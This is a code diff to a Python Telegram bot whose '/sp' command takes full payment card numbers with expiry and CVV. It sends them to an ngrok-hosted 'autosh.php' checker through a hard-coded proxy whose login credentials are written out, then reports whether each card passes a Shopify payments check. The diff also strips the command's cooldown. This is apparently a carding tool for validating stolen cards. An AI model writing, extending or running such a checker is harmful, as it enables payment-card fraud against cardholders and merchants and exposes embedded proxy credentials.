@@ -2794,47 +2794,53 @@ async def get_bin_details(bin_number: str) -> dict:
 
     return bin_data
 
+import asyncio
+import aiohttp
+import json
+from html import escape
+from telegram import Update
+from telegram.constants import ParseMode
+from telegram.ext import ContextTypes
+from db import get_user, update_user, init_db
+
+# Ensure DB is initialized
+asyncio.get_event_loop().run_until_complete(init_db())
+
 async def sp(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
     user_id = user.id
 
-    # --- Enforce cooldown ---
-    if not await enforce_cooldown(user_id, update, cooldown_seconds=5):
-        return
-
     # --- Check arguments ---
     if not context.args:
         await update.message.reply_text(
-            "❌ Usage: /sp <card_number|mm|yyyy|cvv> [gateway]",
+            "❌ Usage: /sp <card_number|mm|yyyy|cvv>",
             parse_mode=ParseMode.HTML
         )
         return
 
     card_input = context.args[0].strip()
-    gateway = context.args[1].strip().lower() if len(context.args) > 1 else "shopify_payments"
 
-    # --- BIN info ---
-    cc_parts = card_input.split("|")
-    cc_number = cc_parts[0]
-    bin_number = cc_number[:6]
-    bin_details = await get_bin_details(bin_number)
-    brand = (bin_details.get("scheme") or "N/A").upper()
-    issuer = (bin_details.get("bank") or "N/A").title()
+    # --- Fetch BIN info from your DB or API ---
+    bin_number = card_input.split("|")[0][:6]
+    user_data = await get_user(user_id)
+    bin_details = user_data.get("bin_info", {})  # Optional: store bin info per user
+    brand = bin_details.get("scheme", "N/A").upper()
+    bank = bin_details.get("bank", "N/A").title()
     country_name = bin_details.get("country_name", "N/A")
     country_flag = bin_details.get("country_emoji", "")
 
-    # --- Prepare processing message ---
+    # --- Send processing message ---
     processing_msg = await update.message.reply_text(
         f"⏳ Checking card: <code>{escape(card_input)}</code>...",
         parse_mode=ParseMode.HTML
     )
 
-    # --- API request ---
+    # --- Prepare API URL ---
     api_url = (
-        f"https://7feeef80303d.ngrok-free.app/autosh.php"
+        "https://7feeef80303d.ngrok-free.app/autosh.php"
         f"?cc={card_input}"
-        f"&site=https://example.com"
-        f"&proxy=107.172.163.27:6543:nslqdeey:jhmrvnto65s1"
+        "&site=https://example.com"
+        "&proxy=107.172.163.27:6543:nslqdeey:jhmrvnto65s1"
     )
 
     try:
@@ -2846,48 +2852,37 @@ async def sp(update: Update, context: ContextTypes.DEFAULT_TYPE):
         try:
             data = json.loads(api_response)
         except json.JSONDecodeError:
-            await processing_msg.edit_text(
-                f"❌ Invalid response from API:\n<pre>{escape(api_response)}</pre>",
-                parse_mode=ParseMode.HTML
-            )
-            return
+            data = {"Response": api_response.strip(), "Price": "-"}
 
-        # --- Extract fields safely ---
-        response_text = data.get("Response", "Unknown")
-        amount = data.get("Price") or "-"
-        gateway_name = data.get("Gateway") or gateway
-        brand_name = data.get("Brand") or brand
-        bank_name = data.get("Bank") or issuer
-        country_display = data.get("Country") or f"{country_flag} {country_name}"
+        # --- Extract API fields ---
+        response = data.get("Response", "Unknown")
+        amount = data.get("Price", "-")
+        gateway_name = data.get("Gateway", "shopify_payments")
+        brand_name = data.get("Brand", brand)
+        bank_name = data.get("Bank", bank)
+        country_display = data.get("Country", f"{country_flag} {country_name}")
 
-        # --- Fallback if error in response ---
-        if "Error" in response_text or "SSL" in response_text:
-            amount = "-"
-            gateway_name = "-"
-            brand_name = "-"
-            bank_name = "-"
-            country_display = "-"
-
+        # --- Format message ---
         requester = f"@{user.username}" if user.username else str(user.id)
         DEVELOPER_NAME = "kคli liຖนxx"
         DEVELOPER_LINK = "https://t.me/K4linuxxxx"
         developer_clickable = f"<a href='{DEVELOPER_LINK}'>{DEVELOPER_NAME}</a>"
 
-        BULLET_GROUP_LINK = "https://t.me/YourGroupHere"  # replace with your group
-        bullet_link = f"<a href='{BULLET_GROUP_LINK}'>✗</a>"
+        BULLET_GROUP_LINK = "https://t.me/YourGroupHere"  # <-- replace with your link
+        bullet_link = f"[<a href='{BULLET_GROUP_LINK}'>✗</a>]"
 
         formatted_msg = (
             f"═══[ SHOPIFY_PAYMENTS ]═══\n"
             f"{bullet_link} <b>Card</b> ➜ <code>{escape(card_input)}</code>\n"
             f"{bullet_link} <b>Gateway</b> ➜ {escape(gateway_name)}\n"
             f"{bullet_link} <b>Amount</b> ➜ {escape(str(amount))}\n"
-            f"{bullet_link} <b>Response</b> ➜ <i>{escape(response_text)}</i>\n"
+            f"{bullet_link} <b>Response</b> ➜ <i>{escape(response)}</i>\n"
             f"――――――――――――――――\n"
             f"{bullet_link} <b>Brand</b> ➜ {escape(brand_name)}\n"
             f"{bullet_link} <b>Bank</b> ➜ {escape(bank_name)}\n"
             f"{bullet_link} <b>Country</b> ➜ {escape(country_display)}\n"
             f"――――――――――――――――\n"
-            f"{bullet_link} <b>Request By</b> ➜ {requester}\n"
+            f"{bullet_link} <b>Requested By</b> ➜ {requester}\n"
             f"{bullet_link} <b>Developer</b> ➜ {developer_clickable}\n"
             f"――――――――――――――――"
         )
@@ -2904,11 +2899,13 @@ async def sp(update: Update, context: ContextTypes.DEFAULT_TYPE):
             parse_mode=ParseMode.HTML
         )
     except Exception as e:
-        logger.exception("Error in /sp command")
+        import logging
+        logging.exception("Error in /sp")
         await processing_msg.edit_text(
             f"❌ Error: <code>{escape(str(e))}</code>",
             parse_mode=ParseMode.HTML
         )
+
 
 
 
